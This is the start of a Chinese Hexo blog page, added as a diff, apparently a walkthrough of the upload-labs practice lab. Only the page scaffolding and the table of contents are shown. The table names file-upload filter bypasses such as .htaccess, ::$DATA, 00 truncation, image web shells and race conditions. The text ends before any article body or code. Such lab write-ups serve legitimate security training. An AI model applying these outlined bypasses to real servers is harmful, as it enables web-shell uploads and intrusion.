@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"eryao7.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="目录 [Pass-01 前端js验证](#Pass-01 前端js验证) [Pass-02 后端MIME验证](#Pass-02 后端MIME验证) [Pass-03 黑名单验证](#Pass-03 黑名单验证) [Pass-04 黑名单验证.htaccess](#Pass-04 黑名单验证.htaccess) Pass-05大小写绕过 [Pass-6 空格绕过](#Pass-6 空格绕过) [">
+<meta property="og:type" content="article">
+<meta property="og:title" content="upload-labs通关详解">
+<meta property="og:url" content="http://eryao7.github.io/2021/11/11/upload-labs%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="ErYao7">
+<meta property="og:description" content="目录 [Pass-01 前端js验证](#Pass-01 前端js验证) [Pass-02 后端MIME验证](#Pass-02 后端MIME验证) [Pass-03 黑名单验证](#Pass-03 黑名单验证) [Pass-04 黑名单验证.htaccess](#Pass-04 黑名单验证.htaccess) Pass-05大小写绕过 [Pass-6 空格绕过](#Pass-6 空格绕过) [">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e56378ac0f58486eabe7a9b5c7d8aced.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/74a110d5df684a34b3410576264c7b08.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1857c957f2734623bf324cc86c317e70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4ee9198e11a44a4182586168ad069987.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2584aaca7c8147e69656df9d3739f556.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/99daaeb5cd0f44b69589614d28077bde.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/df8ea76283954463b00e6312109c512e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4d889ab20d4346eea055e444fc1a6fe0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ebd42d74095f4bb29ba6e83b309fe05b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9cbf1c0484604c5e9cb5e51dde0ac86f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a605ae7a569d4ba68947d33731d7c414.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fd470206681145a1a311a418cdb990f8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e7b58bb9b59c42a3a9255e21e49046e3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/241f4e676e4b45aa809a7ad85d1f275b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/91bc82f9f6284916a7f6a9d9c54fa8fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/369b883dcf6b4ef5899da6f2675a8e2c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2d6a07c7e7934d70a656312bb58c7bae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fb218d6312214ae9aba975b3f15bf451.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a99a7b8c536943868e39ee303c32f7c5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/37d1de5b9f6e4e28ab99232e7bfc5580.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/78796c39c1ec406486ef09c177b41d60.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4989c126762b4cebb821615537b0af49.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fd0ed2c905c8410395345d1b9bd59344.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/729e555cf1b34077a5b6c788284c7452.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/558ff87a68824415ac9f5e432b1e29bd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c9e46cfdb2aa41f2a59fc8eafbf42158.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9e8243a1b57e42d7bca8b02cd6638cdd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="article:published_time" content="2021-11-11T02:46:43.000Z">
+<meta property="article:modified_time" content="2021-11-11T02:52:31.137Z">
+<meta property="article:author" content="ErYao7">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/e56378ac0f58486eabe7a9b5c7d8aced.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16">
+
+
+<link rel="canonical" href="http://eryao7.github.io/2021/11/11/upload-labs%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://eryao7.github.io/2021/11/11/upload-labs%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/","path":"2021/11/11/upload-labs通关详解/","title":"upload-labs通关详解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>upload-labs通关详解 | ErYao7</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?c92ad4f568c8e98b7c047d3479b8585b"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="ErYao7" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">ErYao7</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-01-%E5%89%8D%E7%AB%AFjs%E9%AA%8C%E8%AF%81"><span class="nav-text">Pass-01 前端js验证</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-02-%E5%90%8E%E7%AB%AFMIME%E9%AA%8C%E8%AF%81"><span class="nav-text">Pass-02 后端MIME验证</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-03-%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81"><span class="nav-text">Pass-03 黑名单验证</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-04-%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-htaccess"><span class="nav-text">Pass-04 黑名单验证.htaccess</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-05%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-text">Pass-05大小写绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-6-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-text">Pass-6 空格绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-07-%E7%82%B9%E7%BB%95%E8%BF%87"><span class="nav-text">Pass-07 点绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-1"><span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-08-DATA%E7%BB%95%E8%BF%87"><span class="nav-text">Pass-08 ::$DATA绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-09-%E7%82%B9-%E7%A9%BA%E6%A0%BC-%E7%82%B9-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-text">Pass-09 点+空格+点+空格绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-2"><span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-10-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-text">Pass-10 双写绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-11-00%E6%88%AA%E6%96%AD"><span class="nav-text">Pass-11 00截断</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-12-00%E6%88%AA%E6%96%AD"><span class="nav-text">Pass-12 00截断</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-13-%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87"><span class="nav-text">Pass-13 图片马绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-14-getimagesize-%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="nav-text">Pass-14 getimagesize()-图片马</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-15"><span class="nav-text">Pass-15</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-16-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87"><span class="nav-text">Pass-16 二次渲染绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-17-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-text">Pass-17 条件竞争</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-18"><span class="nav-text">Pass-18</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-19-00%E6%88%AA%E6%96%AD"><span class="nav-text">Pass-19 00截断</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-20"><span class="nav-text">Pass-20</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%87%E6%B3%A8"><span class="nav-text">备注</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ErYao7"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">ErYao7</p>
+  <div class="site-description" itemprop="description">欢迎来到ErYao7的博客~</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://eryao7.github.io/2021/11/11/upload-labs%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ErYao7">
+      <meta itemprop="description" content="欢迎来到ErYao7的博客~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ErYao7">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          upload-labs通关详解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-11-11 10:46:43 / 修改时间：10:52:31" itemprop="dateCreated datePublished" datetime="2021-11-11T10:46:43+08:00">2021-11-11</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p> <strong>目录</strong></p>
+<p>[Pass-01 前端js验证](#Pass-01 前端js验证)</p>
+<p>[Pass-02 后端MIME验证](#Pass-02 后端MIME验证)</p>
+<p>[Pass-03 黑名单验证](#Pass-03 黑名单验证)</p>
+<p>[Pass-04 黑名单验证.htaccess](#Pass-04 黑名单验证.htaccess)</p>
+<p><a href="#Pass-05%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87">Pass-05大小写绕过</a></p>
+<p>[Pass-6 空格绕过](#Pass-6 空格绕过)</p>
+<p>[Pass-07 点绕过](#Pass-07 点绕过)</p>
+<p>[Pass-08 ::$DATA绕过](#Pass-08 ::$DATA绕过)</p>
+<p>[Pass-09 点+空格+点+空格绕过](#Pass-09 点+空格+点+空格绕过)</p>
+<p>[Pass-10 双写绕过](#Pass-10 双写绕过)</p>
+<p>[ Pass-11 00截断](# Pass-11 00截断)</p>
+<p>[Pass-12 00截断](#Pass-12 00截断)</p>
+<p>[Pass-13 图片马绕过](#Pass-13 图片马绕过)</p>
+<p>[Pass-14 getimagesize()-图片马](#Pass-14 getimagesize()-图片马)</p>
+<p><a href="#Pass-15">Pass-15</a></p>
+<p>[Pass-16 二次渲染绕过](#Pass-16 二次渲染绕过)</p>
+<p>[Pass-17 条件竞争](#Pass-17 条件竞争)</p>
+<p><a href="#Pass-18">Pass-18</a></p>
+<p>[Pass-19 00截断](#Pass-19 00截断)</p>
+<p><a href="#Pass-20">Pass-20</a></p>
+<p><a href="#%E5%A4%87%E6%B3%A8">备注</a></p>
+<hr>
+<span id="more"></span>
+
